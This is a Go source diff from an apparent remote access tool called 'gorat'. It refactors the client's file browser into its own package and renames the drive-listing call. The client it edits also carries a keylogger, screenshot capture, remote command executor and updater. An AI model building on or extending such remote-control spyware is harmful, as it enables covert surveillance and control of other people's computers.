@@ -16,6 +16,7 @@ import (
 	"sync"
 	"time"
 
+	"gorat/pkg/filebrowser"
 	"gorat/pkg/protocol"
 
 	"github.com/gorilla/websocket"
@@ -269,7 +270,7 @@ type Client struct {
 
 	// Component handlers
 	commandExec *CommandExecutor
-	fileBrowser *FileBrowser
+	fileBrowser *filebrowser.Browser
 	screenshot  *ScreenshotCapture
 	keylogger   *Keylogger
 	updater     *Updater
@@ -314,7 +315,7 @@ func NewClient(config *Config, instanceMgr *InstanceManager) *Client {
 	if ShouldLog() {
 		log.Printf("[DEBUG] NewClient: Creating file browser")
 	}
-	fileBrowser := NewFileBrowser()
+	fileBrowser := filebrowser.New()
 	if ShouldLog() {
 		log.Printf("[DEBUG] NewClient: Creating screenshot capture")
 	}
@@ -1006,7 +1007,7 @@ func (c *Client) handleBrowseFiles(msg *protocol.Message) {
 // handleGetDrives handles drive listing requests (Windows)
 func (c *Client) handleGetDrives(msg *protocol.Message) {
 	log.Printf("Getting drive list")
-	result := c.fileBrowser.GetDrives()
+	result := c.fileBrowser.Drives()
 
 	c.sendMessage(protocol.MsgTypeDriveList, result)
 }
